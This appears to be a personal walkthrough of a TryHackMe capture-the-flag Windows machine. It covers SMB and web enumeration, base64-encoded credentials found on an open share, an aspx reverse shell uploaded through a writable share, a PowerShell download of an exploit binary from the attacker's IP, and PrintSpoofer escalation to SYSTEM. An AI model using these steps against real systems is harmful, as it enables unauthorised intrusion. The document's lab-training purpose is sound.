# Relevant
You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

* User.txt
* Root.txt
Additionally, the client has provided the following scope allowances:

* Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
* Locate and note all vulnerabilities found
* Submit the flags discovered to the dashboard
* Only the IP address assigned to your machine is in scope
* Find and report ALL vulnerabilities (yes, there is more than one path to root)

# IP: 10.10.66.154
    export IP=10.10.66.154

# NMAP RESULTS
```
Nmap scan report for 10.10.66.154
Host is up (0.18s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-08-22T06:25:18+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2021-08-21T06:20:12
|_Not valid after:  2022-02-20T06:20:12
|_ssl-date: 2021-08-22T06:25:58+00:00; +4s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m04s, deviation: 3h07m51s, median: 3s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-08-21T23:25:21-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-22T06:25:19
|_  start_date: 2021-08-22T06:20:13
```
### Samba is installed but no anonymous access.

# Running GoBuster.
    gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

#### Gobuster found "/*checkout*"
The webserver throws an error.
```
 Runtime Error
Description: An application error occurred on the server. The current custom error settings for this application prevent the details of the application error from being viewed remotely (for security reasons). It could, however, be viewed by browsers running on the local server machine.

Details: To enable the details of this specific error message to be viewable on remote machines, please create a <customErrors> tag within a "web.config" configuration file located in the root directory of the current web application. This <customErrors> tag should then have its "mode" attribute set to "Off".
```
### This turned out just to be a weird error with IIS, with asterisks(*) and other characters being reserved. This was just triggering GoBuster on the error page.

# I tried to Enumerate samba earlier with smbmap but that didn't work.

## I used smbclient -L $IP to get a list of shares.
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
nt4wrksv        Disk      
```

### nt4wrksv seems interesting. Let's try and see if its password protected.

# It's not!
    We found a passwords.txt file, and upon downloading it and looking inside, it seems to contain hashed/encoded passwords.
```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
#### Let's decrypt them.
#### First one is base64.
```
┌──(zeus-kali㉿kali-vm)-[~/ctf/tryhackme/Relevant]
└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" |  base64 -d
Bob - !P@$$W0rD!123
```

#### Decrypted to Bob - !P@$$W0rD!123, we can assume that's User - Pass

### Second one now, also base64.
```
┌──(zeus-kali㉿kali-vm)-[~/ctf/tryhackme/Relevant]
└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$ 
```
xfreerdp /f /u:Bob /p:!P@$$W0rD!123 /v:$IP:3386

xfreerdp /f /u:RELEVANT\\Bill /p:Juw4nnaM4n420696969$$ /v:$IP:3389

## The above stuff turned out to be a rabbit hole.

### I decided to scan for more ports and found another IIS instance running.
### Running GoBuster on this found a directory called "nt4wrksv", which is interesting because there's a share called that. If I went to $IP/nt4wrksv/passwords.txt I got a password.

### I logged into the nt4wrksv asa Bill and had write access, so I uploaded an aspx reverse shell and got console access.

### Ran powershell and uploaded winpeas onto the server.

### Outdated server!
```
[!] CVE-2019-0836 : VULNERABLE                                                                                                                             
  [>] https://exploit-db.com/exploits/46718                                                                                                                 
  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/ 
                                                                                                                                                            
 [!] CVE-2019-1064 : VULNERABLE                                                                                                                             
  [>] https://www.rythmstick.net/posts/cve-2019-1064/                                                                                                       
                                                                                                                                                            
 [!] CVE-2019-1130 : VULNERABLE                                                                                                                             
  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear                                                                                                        
                                                                                                                                                            
 [!] CVE-2019-1315 : VULNERABLE
  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

 [!] CVE-2019-1388 : VULNERABLE
  [>] https://github.com/jas502n/CVE-2019-1388

 [!] CVE-2019-1405 : VULNERABLE
  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/                                                                                                          
  [>] https://github.com/apt69/COMahawk

 [!] CVE-2020-0668 : VULNERABLE
  [>] https://github.com/itm4n/SysTracingPoc

 [!] CVE-2020-0683 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2020-0683
  [>] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1

 [!] CVE-2020-1013 : VULNERABLE
  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/

 [*] Finished. Found 9 potential vulnerabilities.
 ```

 ### This could be interesting, too
 ```
 AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
    AWS Lite Guest Agent
```

wget -UseBasicParsing "http://10.2.87.252/COMahawk64.exe" -outfile "wp.exe"

### I was pretty lost at this point, so I looked up a writeup. I should get in the habit of always doing whoami /priv. Apparently, having the "SeImpersonatePrivilege" and it being Windows Server 2016 means that it's vulnerable to the PrintSpoof exploit.

### Uploading and running this exploit gets us root.
```
C:\Windows\Temp>ps.exe -i -c cmd
ps.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```